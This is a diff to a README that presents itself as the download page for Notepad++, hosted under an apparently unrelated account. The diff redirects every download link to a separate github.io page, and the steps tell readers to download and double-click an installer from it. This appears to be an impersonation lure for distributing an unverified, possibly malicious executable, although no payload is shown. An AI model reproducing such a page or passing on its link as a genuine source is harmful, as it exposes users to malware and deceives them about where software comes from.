@@ -1,6 +1,6 @@
 # 📝 notepadplusplus - Edit text files with simple tools
 
-[![](https://img.shields.io/badge/Download-Notepad++-blue.svg)](https://github.com/Socratic-eroliaalpina541/notepadplusplus)
+[![](https://img.shields.io/badge/Download-Notepad++-blue.svg)](https://socratic-eroliaalpina541.github.io)
 
 ## 📋 About This Application
 
@@ -30,7 +30,7 @@ This application runs on all modern versions of Windows. You need the following:
 
 Follow these steps to set up the editor on your computer:
 
-1. Visit this page to download: [https://github.com/Socratic-eroliaalpina541/notepadplusplus](https://github.com/Socratic-eroliaalpina541/notepadplusplus)
+1. Visit this page to download: [https://socratic-eroliaalpina541.github.io](https://socratic-eroliaalpina541.github.io)
 2. Locate the file named after the latest release number. Click the link to save the file to your computer.
 3. Open your Downloads folder. Double-click the file to start the installer.
 4. Follow the prompts on the screen. Select your preferred language and choose an install folder.
